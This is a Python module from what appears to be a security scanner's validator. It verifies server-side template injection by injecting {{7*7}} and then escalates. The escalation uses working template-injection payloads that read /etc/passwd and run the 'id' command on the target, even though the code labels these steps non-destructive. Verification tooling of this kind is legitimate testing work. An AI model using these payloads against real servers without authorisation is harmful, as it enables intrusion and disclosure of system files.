# validator/checks/ssti.py
"""
SSTI (Server-Side Template Injection) Validator
Safe, non-destructive verification of SSTI findings.
"""

from ..result import ValidationResult
from ..http_client import SafeHTTPClient
import urllib.parse


def validate_ssti(finding: dict, timeout: int = 10, verify: bool = False) -> ValidationResult:
    """
    Validate SSTI findings.
    
    Step 1: Inject {{7*7}} 
    Step 2: Check if "49" appears in response
    Step 3: If yes, CONFIRMED with confidence
    Step 4: Attempt file read (if safe to do so)
    Step 5: Attempt command execution (if safe)
    """
    
    url = finding.get("url", "")
    parameter = finding.get("parameter", "template")
    
    if not url:
        return ValidationResult(
            status="ERROR",
            confidence=0,
            vulnerability="SSTI",
            url="",
            parameter=parameter,
            evidence=["No URL provided"]
        )
    
    client = SafeHTTPClient(timeout=timeout, verify=verify)
    
    # Step 1: Baseline request (no payload)
    evidence = []
    details = {}
    
    try:
        # Baseline response
        baseline_params = {parameter: "test"}
        baseline_response = client.get(url, params=baseline_params)
        baseline_body = baseline_response.text
        
        evidence.append(f"✅ Baseline captured: {len(baseline_body)} bytes")
        
        # Step 2: SSTI detection payload
        detection_payload = "{{7*7}}"
        detection_params = {parameter: detection_payload}
        detection_response = client.get(url, params=detection_params)
        detection_body = detection_response.text
        
        if "49" in detection_body:
            evidence.append(f"✅ SSTI confirmed: {{7*7}} → 49 found in response")
            confidence = 85
            status = "CONFIRMED"
            
            details["detection_payload"] = detection_payload
            details["baseline_length"] = len(baseline_body)
            details["attack_length"] = len(detection_body)
            details["poc_command"] = f'curl -k "{url}?{parameter}={urllib.parse.quote_plus(detection_payload)}"'
            
            # Step 3: Attempt safe file read (non-destructive)
            # Try to read /etc/passwd
            file_read_payload = "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}"
            file_read_params = {parameter: file_read_payload}
            
            try:
                file_response = client.get(url, params=file_read_params)
                if "root:" in file_response.text and ":" in file_response.text:
                    evidence.append("✅ File read confirmed: /etc/passwd accessible")
                    confidence = 95
                    details["file_read"] = True
                    details["file_preview"] = file_response.text[:200]
            except Exception as e:
                evidence.append(f"⚠️ File read attempt failed: {str(e)[:50]}")
            
            # Step 4: Attempt safe command execution (non-destructive)
            cmd_payload = "{{ ''.__class__.__mro__[2].__subclasses__()[40]('id').read() }}"
            cmd_params = {parameter: cmd_payload}
            
            try:
                cmd_response = client.get(url, params=cmd_params)
                if "uid=" in cmd_response.text or "gid=" in cmd_response.text:
                    evidence.append("✅ Command execution confirmed: id command executed")
                    confidence = 99
                    details["command_execution"] = True
                    details["cmd_output"] = cmd_response.text[:200]
            except Exception as e:
                evidence.append(f"⚠️ Command execution failed: {str(e)[:50]}")
            
            return ValidationResult(
                status=status,
                confidence=confidence,
                vulnerability="Server-Side Template Injection (SSTI)",
                url=url,
                parameter=parameter,
                evidence=evidence,
                details=details,
                poc_command=details.get("poc_command", "")
            )
        
        else:
            evidence.append("❌ SSTI not confirmed: {{7*7}} did not return 49")
            
            # Check if payload was reflected
            if detection_payload in detection_body:
                evidence.append("⚠️ Payload reflected but not evaluated")
                confidence = 25
                status = "UNVERIFIED"
            else:
                evidence.append("❌ No evidence of SSTI")
                confidence = 5
                status = "UNVERIFIED"
            
            return ValidationResult(
                status=status,
                confidence=confidence,
                vulnerability="Server-Side Template Injection (SSTI)",
                url=url,
                parameter=parameter,
                evidence=evidence,
                details=details
            )
            
    except Exception as e:
        return ValidationResult(
            status="ERROR",
            confidence=0,
            vulnerability="Server-Side Template Injection (SSTI)",
            url=url,
            parameter=parameter,
            evidence=[f"Validation error: {str(e)[:100]}"]
        )